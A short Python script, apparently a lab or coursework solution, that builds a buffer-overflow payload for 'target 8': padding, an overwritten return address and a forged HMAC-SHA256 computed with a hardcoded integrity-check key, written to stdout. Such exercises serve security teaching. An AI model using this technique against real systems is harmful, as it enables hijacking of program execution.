import sys
import hashlib
import hmac

if __name__ == '__main__':

    #Blink the lights
    attack = b"a"*112
    attack += 0x80496d7.to_bytes(4, "little")


    #IN TARGET 8 -> INTEGRETY CHECK
    IC = 0x312f19b2.to_bytes(4, "little")   #0x312f19b2
    IC += 0xc607fe47.to_bytes(4, "little") #0xc607fe47
    IC += 0xb4655194.to_bytes(4, "little") #0xb4655194
    IC += 0xd9e959ca.to_bytes(4, "little") #0xd9e959ca
    IC += 0x8610b505.to_bytes(4, "little") #0x8610b505
    IC += 0x4e0fa2db.to_bytes(4, "little") #0x4e0fa2db
    IC += 0xe6bebb14.to_bytes(4, "little") #0xe6bebb14
    IC += 0x5088032f.to_bytes(4, "little") #0x5088032f
    

    #for the integrity check
    MAC = hmac.new(IC, attack, hashlib.sha256).digest()

    #number of bytes at beginning
    count = len(attack)
    attack = count.to_bytes(4, "little") + attack + MAC

    #output
    sys.stdout.buffer.write(attack)
    